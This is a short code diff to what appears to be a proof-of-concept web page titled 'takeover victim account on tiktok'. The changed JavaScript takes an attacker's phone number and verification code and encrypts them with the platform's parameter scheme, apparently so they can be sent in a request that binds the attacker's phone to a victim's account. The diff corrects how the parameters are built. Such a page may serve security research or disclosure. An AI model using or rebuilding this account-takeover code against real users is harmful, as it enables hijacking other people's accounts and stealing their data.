@@ -36,20 +36,22 @@
             
             function mobileEncrypted(){
               var mobile = document.getElementById("attackermobilenum").value;
-              var e = '{type: 17, mobile: '+mobile+', ticket: ""}'
+              var e = {type: 17, mobile: "null", ticket: ""}
+              e.mobile = mobile;
               console.log(e);
-              var en = encryptParams(e);
-              console.log(en);
-              document.getElementById("encryptedmobile").innerHTML=en;
+              var en = encryptParams(e,["type", "mobile", "code"]);
+              console.log(en.mobile);
+              document.getElementById("encryptedmobile").innerHTML=en.mobile;
             }
             
             function codeEncrypted(){
               var code = document.getElementById("attackercodeid").value;
-              var e = '{type: 17, code: '+code+', ticket: ""}'
+              var e = {type: 17, code: "null", ticket: ""}
+              e.code = code;
               console.log(e);
-              var en = encryptParams(e);
-              console.log(en);
-              document.getElementById("encryptedcode").innerHTML=en;
+              var en = encryptParams(e,["type", "mobile", "code"]);
+              console.log(en.code);
+              document.getElementById("encryptedcode").innerHTML=en.code;
             }
 </script>
 <h1 style="text-align:center;">takeover victim account on tiktok</h1>
